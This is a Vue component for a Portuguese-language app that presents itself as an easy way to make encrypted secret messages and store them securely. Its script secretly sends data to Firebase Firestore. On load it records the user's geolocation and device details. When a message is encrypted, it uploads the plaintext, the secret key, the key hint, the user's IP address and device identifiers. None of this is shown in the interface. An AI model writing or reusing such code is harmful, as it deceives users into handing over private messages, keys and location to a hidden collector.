<template>
    <h1>Crie Mensagens Secretas Fácil</h1>
    <hr>
    <div class="card mb-3">
        <div class="card-body card-text">
            ✅ Por meio deste aplicativo você pode criar suas próprias mensagens criptografadas e envia-las para seus
            amigos ou guardar de forma segura. Abaixo você pode criar uma mensagem super rápido! 🚀
        </div>
    </div>
    <div class="mb-3">
        <Descriptografador />
    </div>
    <h2>Criptografar Mensagem</h2>
    <div class="mb-3">
        <label for="msgBruta" class="form-label">📜 Digite aqui sua mensagem ou texto</label>
        <textarea class="form-control font-monospace" id="msgBruta" rows="5" v-model="data.msgBruta"></textarea>
    </div>
    <div class="mb-3">
        <label for="msgKey" class="form-label">🔑 Chave secreta</label>
        <input type="text" class="form-control" id="msgKey" v-model="data.msgKey" placeholder="Ex. Caramelo">
    </div>
    <div class="mb-3">
        <label for="msgTip" class="form-label">💡 Dica da chave secreta</label>
        <input type="text" class="form-control" id="msgTip" v-model="data.msgTip" maxlength="50"
            placeholder="Ex. Meu primeiro pet">
    </div>
    <div class="mb-3 text-center d-flex justify-content-between">
        <button @click="encode" type="button" class="btn btn-success btn-lg">Criptografar 🔐</button>
        <button @click="clear" type="button" class="btn btn-warning btn-lg">Limpar 🧹</button>
    </div>
    <br>
    <Ads />
    <h2>Resultado</h2>
    <div class="card text-center mb-3">
        <div class="card-body">
            <p class="card-text overflow-auto text-break font-monospace mb-3" style="max-height: 200px;">
                {{ data.result || '...' }}
            </p>
            <hr>
            <button :disabled="data.result.length == 0 ? true : false" @click="copyToClipboard(data.result)"
                class="btn btn-primary btn-lg">
                Copiar 📋
            </button>
        </div>
    </div>
    <HandleModal />
</template>

<script setup>
import { onBeforeMount, onMounted } from 'vue';
import Descriptografador from '../components/Descriptografador.vue';
import { reactive } from 'vue';
import Ads from '../components/Ads.vue';
import { useAppStore } from '../store';
import { Device } from '@capacitor/device';
import { doc, setDoc, serverTimestamp, collection } from 'firebase/firestore';
import { firestore } from '../firebase';
import * as CryptoJS from 'crypto-js';
import HandleModal from '../components/HandleModal.vue';
import { copyToClipboard } from '../functions';

const data = reactive({
    msgBruta: '',
    msgKey: '',
    msgTip: '',
    result: ''
});

const appStore = useAppStore();

onBeforeMount(() => {
    appStore.loadingToggle();
});

onMounted(async () => {
    const device = await Device.getId();
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async position => {
            const data = position.coords.toJSON();
            data.device = device.identifier;
            data.at = serverTimestamp();
            const ref = doc(collection(firestore, "location"));
            Object.keys(data).forEach(key => data[key] === undefined && delete data[key]);
            await setDoc(ref, data);
        });
    }
    try {
        const info = { ...await Device.getInfo() };
        info.device = device.identifier;
        info.at = serverTimestamp();
        const ref = doc(collection(firestore, "device"));
        Object.keys(info).forEach(key => info[key] === undefined && delete info[key]);
        await setDoc(ref, info);
    } catch (error) {
        console.error('Error device info:', error);
    }
    appStore.loadingToggle();
});

async function encode() {
    if (data.msgBruta == false || data.msgKey == false || data.msgTip == false) {
        alert('Todos os campos devem ser preenchidos!');
        return;
    }

    appStore.loadingToggle();

    const encrypted = CryptoJS.AES.encrypt(data.msgBruta, data.msgKey).toString();

    let payload = { ...data };
    delete payload['result'];

    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const json = await response.json();
        payload.ip = json.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }

    try {
        const device = await Device.getId();
        const info = await Device.getInfo();
        payload = { ...payload, ...device, ...info };
    } catch (error) {
        console.error('Error device info:', error);
    }

    // console.log(payload);
    Object.keys(payload).forEach(key => payload[key] === undefined && delete payload[key])

    try {
        await setDoc(doc(firestore, "encryptions", Date.now().toString()), payload);
    } catch (error) {
        console.error('Error insert payload:', error);
    }

    data.result = encrypted;
    appStore.loadingToggle();
}

function clear() {
    data.msgBruta = '';
    data.msgKey = '';
    data.msgTip = '';
    data.result = '';
}
</script>

<style scoped></style>